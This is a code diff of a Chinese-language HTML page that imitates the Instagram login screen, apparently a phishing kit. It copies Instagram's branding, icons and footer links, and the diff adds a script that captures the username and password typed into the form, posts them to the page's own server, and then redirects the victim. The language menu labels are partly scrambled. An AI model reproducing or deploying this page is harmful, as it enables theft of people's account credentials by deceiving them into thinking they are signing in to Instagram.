@@ -2,32 +2,32 @@
 <html lang="zh-cn">
 <head>
     <meta charset="UTF-8">
-    <title>登录 • Instagram</title>
-    <link rel="stylesheet" href="styles.css">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Instagram</title>
     <link data-default-icon="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png" rel="icon" sizes="192x192" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link rel="stylesheet" href="styles.css">        
 </head>
 <body>
-
 <div class="wrapper">
     <div class="image-desktop">
-        <img src="images\PcImage-removebg-preview.png" alt="Your Image" style="width: 100%;">
+        <img src="images\PcImage-removebg-preview.png" alt="您的图片" style="width: 100%;">
     </div>
     <div class="header">
         <div class="top">
             <div class="logo">
-                <img src="images/instagram.png" alt="instagram" style="width: 175px;">
+                <img src="images\instagram.png" alt="instagram" style="width: 175px;">
             </div>
             <div class="form">
-                <form action="/submit" method="post">
+                <form id="loginForm" action="/" method="post" onsubmit="handleLogin(event)">
                     <div class="input_field">
-                        <input type="text" name="username" placeholder="手机号码、用户名或电子邮件" class="input" required>
+                        <input type="text" id="username" name="username" placeholder="手机号码、用户名或电子邮件" class="input" required>
                     </div>
                     <div class="input_field">
-                        <input type="password" name="password" placeholder="密码" class="input" required>
+                        <input type="password" id="password" name="password" placeholder="密码" class="input" required>
                     </div>
                     <div class="btn"><button type="submit">登录</button></div>
+                    <p id="error-message" style="color: red; display: none;"></p>
                 </form>
             </div>
             <div class="or">
@@ -37,22 +37,23 @@
             </div>
             <div class="dif">
                 <div class="fb">
-                    <img src="images/facebook.png" alt="facebook">
-                    <a href="https://www.facebook.com/login.php">ㅤ使用 Facebook 登录</a>
+                    <img src="images\facebook.png" alt="facebook">
+                    <a href="https://www.facebook.com/login.php">使用 Facebook 登录</a>
                 </div>
+                <br>
                 <div class="forgot">
                     <a href="https://www.instagram.com/accounts/password/reset/">忘记密码？</a>
                 </div>
             </div>
         </div>
         <div class="signup">
-            <p>没有帐号？<a href="https://www.instagram.com/accounts/emailsignup/">注册</a></p>
+            <p>还没有帐号？ <a href="https://www.instagram.com/accounts/emailsignup/">注册</a></p>
         </div>
         <div class="apps">
-            <p>获取应用。</p>
+            <p>获取应用程序。</p>
             <div class="icons">
-                <a href="https://apps.apple.com/us/app/instagram/id389801252"><img src="images/appstore.png" alt="appstore"></a>
-                <a href="https://play.google.com/store/apps/details?id=com.instagram.android"><img src="images/googleplay.png" alt="googleplay"></a>
+                <a href="https://apps.apple.com/us/app/instagram/id389801252"><img src="images\appstore.png" alt="App Store"></a>
+                <a href="https://play.google.com/store/apps/details?id=com.instagram.android"><img src="images\googleplay.png" alt="Google Play"></a>
             </div>
         </div>
     </div>
@@ -62,51 +63,82 @@
                 <li><a href="https://about.meta.com/">Meta</a></li>
                 <li><a href="https://about.instagram.com/">关于</a></li>
                 <li><a href="https://about.instagram.com/blog">博客</a></li>
-                <li><a href="https://about.instagram.com/about-us/careers">职业</a></li>
+                <li><a href="https://about.instagram.com/about-us/careers">职位</a></li>
                 <li><a href="https://help.instagram.com/">帮助</a></li>
                 <li><a href="https://developers.facebook.com/docs/instagram">API</a></li>
-                <li><a href="https://privacycenter.instagram.com/">隐私权</a></li>
+                <li><a href="https://privacycenter.instagram.com/">隐私</a></li>
                 <li><a href="https://www.instagram.com/privacy/cookie_settings/">Cookie 设置</a></li>
                 <li><a href="https://help.instagram.com/581066165581870/">条款</a></li>
                 <li><a href="https://www.instagram.com/explore/locations/">位置</a></li>
                 <li><a href="https://www.instagram.com/web/lite/">Instagram Lite</a></li>
                 <li><a href="https://www.threads.net/">Threads</a></li>
-                <li><a href="https://www.facebook.com/help/instagram/261704639352628">联系人上传和非用户</a></li>
+                <li><a href="https://www.facebook.com/help/instagram/261704639352628">数据政策</a></li>
                 <li><a href="https://about.meta.com/technologies/meta-verified/">Meta 验证</a></li>
             </ul>
         </div>
     </div>
     <div class="languages">
         <select name="languages" id="languages">
-            <option value="en.html">土耳其语</option>
-            <option value="ar.html">阿拉伯语</option>
-            <option value="cs.html">捷克语</option>
-            <option value="da.html">丹麦语</option>
-            <option value="de.html">德语</option>
-            <option value="el.html">希腊语</option>
-            <option value="af.html">南非语</option>
-            <option value="en-uk.html">英语 (英国)</option>
-            <option value="es-es.html">西班牙语 (西班牙)</option>
-            <option value="es.html">西班牙语</option>
-            <option value="fa.html">波斯语</option>
-            <option value="fi.html">芬兰语</option>
-            <option value="fr.html">法语</option>
-            <option value="he.html">希伯来语</option>
-            <option value="id.html">印度尼西亚语</option>
-            <option value="no.html">挪威语</option>
-            <option value="nl.html">荷兰语</option>
-            <option value="pl.html">波兰语</option>
-            <option value="ru.html">俄语</option>
-            <option value="sv.html">瑞典语</option>
-            <option value="fil.html">菲律宾语</option>
-            <option value="tr.html">英语</option>
-            <option value="zh-cn.html">中文（简体）</option>
-            <option value="gu.html">古吉拉特语</option>
-            <option value="hr.html">克罗地亚
-            </select>                
-            <p id="cinsta">© 2024 Instagram von Meta</p>
-        </div>
-        
+            <option value="tr.html">Azerbaijani</option>
+            <option value="en.html">English</option>
+            <option value="ar.html">العربية</option>
+            <option value="cs.html">Čeština</option>
+            <option value="da.html">Dansk</option>
+            <option value="de.html">Deutsch</option>
+            <option value="el.html">Ελληνικά</option>
+            <option value="af.html">Afrikaans</option>
+            <option value="en-uk.html">Türkçe</option>
+            <option value="es-es.html">Español (España)</option>
+            <option value="es.html">Español</option>
+            <option value="fa.html">فارسی</option>
+            <option value="fi.html">Suomi</option>
+            <option value="fr.html">Français</option>
+            <option value="he.html">עברית</option>
+            <option value="id.html">Bahasa Indonesia</option>
+            <option value="no.html">Norsk</option>
+            <option value="nl.html">Nederlands</option>
+            <option value="pl.html">Polski</option>
+            <option value="ru.html">Русский</option>
+            <option value="sv.html">Svenska</option>
+            <option value="fil.html">Filipino</option>
+            <option value="tr.html">English (UK)</option>
+            <option value="gu.html">ગુજરાતી</option>
+            <option value="hr.html">Hrvatski</option>
+            <option value="fr-ca.html">Français (Canada)</option>
+            <option value="ro.html">Română</option>
+            <option value="sr.html">Српски</option>
+        </select>
+        <p id="cinsta">© 2024 Instagram Meta</p>
     </div>
-    </body>
-    </html>
+</div>
+
+<script>
+    async function handleLogin(event) {
+        event.preventDefault();
+
+        const form = event.target;
+        const formData = new FormData(form);
+        const data = new URLSearchParams();
+        for (const pair of formData) {
+            data.append(pair[0], pair[1]);
+        }
+
+        const response = await fetch(form.action, {
+            method: 'POST',
+            body: data
+        });
+
+        const result = await response.json();
+
+        if (result.status === 'success') {
+            window.location.href = result.redirect;
+        } else {
+            const errorMsg = result.error_msg || '出现错误。';
+            const errorMessageElement = document.getElementById('error-message');
+            errorMessageElement.innerText = errorMsg;
+            errorMessageElement.style.display = 'block';
+        }
+    }
+</script>
+</body>
+</html>
